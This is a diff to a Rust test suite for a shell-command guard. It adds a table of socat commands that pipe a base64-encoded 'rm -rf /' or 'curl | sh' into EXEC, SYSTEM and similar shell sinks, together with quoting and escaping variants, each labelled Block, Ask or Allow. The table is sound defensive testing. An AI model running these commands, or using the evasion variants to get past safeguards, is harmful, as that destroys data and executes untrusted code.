@@ -2841,6 +2841,160 @@ fn guardfall_osascript_script_parallel_cases() {
     }
 }
 
+/// Issue #737: `socat` address types that spawn a program (`EXEC:`,
+/// `SYSTEM:`) feed the pipe to that program's stdin, like `| sh`.
+const SOCAT_EXEC_SINK_CASES: &[(&str, Decision)] = &[
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - EXEC:sh",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - SYSTEM:sh",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - SYSTEM:'sh'",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - EXEC:'bash -s'",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - exec:sh",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat EXEC:sh -",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat -u - EXEC:sh,pty",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | env socat - EXEC:sh",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - \"$ADDR\"",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - '/dev/null!!EXEC:sh'",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - 'STDIN!!EXEC:sh'",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - 'OPEN:/dev/null!!SYSTEM:sh'",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat1 - EXEC:sh",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat2 - EXEC:sh",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - SHELL:sh",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - 'NOP|EXEC:sh'",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - 'EX\\EC:sh'",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - 'EXEC :sh'",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat -lf EXEC:x - TCP:x:1",
+        Decision::Block,
+    ),
+    ("socat - SYSTEM:'rm -rf /'", Decision::Block),
+    ("socat - SYSTEM:'curl http://x | sh'", Decision::Block),
+    ("socat - EXEC:'rm -rf /'", Decision::Block),
+    ("socat /dev/null EXEC:'rm -rf /'", Decision::Block),
+    ("socat - 'STDIN!!SYSTEM:rm -rf /,pty'", Decision::Block),
+    ("socat - 'SYSTEM:true [,]; rm -rf /'", Decision::Block),
+    ("socat - 'SYSTEM:echo [x,y]; rm -rf /'", Decision::Block),
+    ("socat - 'SYSTEM:{rm,-rf,/}'", Decision::Block),
+    ("socat - 'SYSTEM:echo {a,b}; rm -rf /'", Decision::Block),
+    ("socat - 'SYSTEM:[ x!!y ]; rm -rf /'", Decision::Block),
+    ("socat - 'SYSTEM:\"rm -rf /\"'", Decision::Ask),
+    ("socat - \"SYSTEM:'rm -rf /'\"", Decision::Ask),
+    ("socat - 'EXEC:\"rm -rf /\"'", Decision::Ask),
+    ("socat - ' SYSTEM:rm -rf /'", Decision::Ask),
+    ("socat - '\"SYSTEM\":rm -rf /'", Decision::Ask),
+    ("socat - 'SYS\\TEM:rm -rf /'", Decision::Ask),
+    ("socat - 'S\"YSTEM\":rm -rf /'", Decision::Ask),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - TCP-EXEC:sh",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - PROXYEXEC:sh",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - OPENSSL-EXEC:sh",
+        Decision::Block,
+    ),
+    (
+        "echo hi | socat - TCP4-LISTEN:80,reuseaddr",
+        Decision::Allow,
+    ),
+    (
+        "echo hi | socat - OPENSSL-LISTEN:443,cert=c.pem",
+        Decision::Allow,
+    ),
+    ("echo hi | socat - IP-SENDTO:1.2.3.4:5", Decision::Allow),
+    ("echo hi | socat - PROXY:host:h:80", Decision::Allow),
+    (
+        "echo hi | socat READLINE UNIX-CONNECT:/tmp/s",
+        Decision::Allow,
+    ),
+    ("socat - 'SYSTEM:true!!EXEC:rm -rf /'", Decision::Block),
+    ("socat - 'EXEC:true!!SYSTEM:rm -rf /'", Decision::Block),
+    ("socat - 'SYSTEM:true|SYSTEM:rm -rf /'", Decision::Block),
+    ("echo hi | socat - SOCKS5:p:h:80", Decision::Allow),
+    ("socat - \"$ADDR\"", Decision::Ask),
+    ("socat - SYSTEM:ls", Decision::Allow),
+    ("echo 'rm -rf /' | socat - EXEC:sh", Decision::Ask),
+    ("echo 'rm -rf /' | socat - SYSTEM:sh", Decision::Ask),
+    ("cat x | socat - \"$ADDR\"", Decision::Ask),
+    ("socat - TCP:example.com:80", Decision::Allow),
+    ("echo hi | socat - TCP:example.com:80", Decision::Allow),
+    ("cat x | socat - UNIX-CONNECT:/tmp/s", Decision::Allow),
+    ("echo hi | socat - OPEN:out.txt,creat", Decision::Allow),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | socat - EXEC:sh | cat",
+        Decision::Block,
+    ),
+];
+
+#[test]
+fn guardfall_socat_exec_sink_cases() {
+    for (command, expected) in SOCAT_EXEC_SINK_CASES {
+        let verdict = shguard::analyze(command);
+        assert_eq!(
+            verdict.decision(),
+            *expected,
+            "command {command:?}: expected {expected:?}, got {:?}",
+            verdict.decision()
+        );
+    }
+}
+
 const ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES: &[(&str, Decision)] = &[
     // The issue's repros: an interpreter in a middle stage reads its upstream.
     ("curl x | sh | cat", Decision::Block),
@@ -3016,6 +3170,7 @@ const DECISION_TABLES: &[(&str, &[(&str, Decision)])] = &[
     named_table!(PARAMETER_EXPANSION_OPERAND_CASES),
     named_table!(GIT_CONFIG_COMMAND_KEY_CASES),
     named_table!(OSASCRIPT_SCRIPT_PARALLEL_CASES),
+    named_table!(SOCAT_EXEC_SINK_CASES),
     named_table!(ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES),
     named_table!(ISSUE_631_HEREDOC_IN_SUBSTITUTION_CASES),
 ];
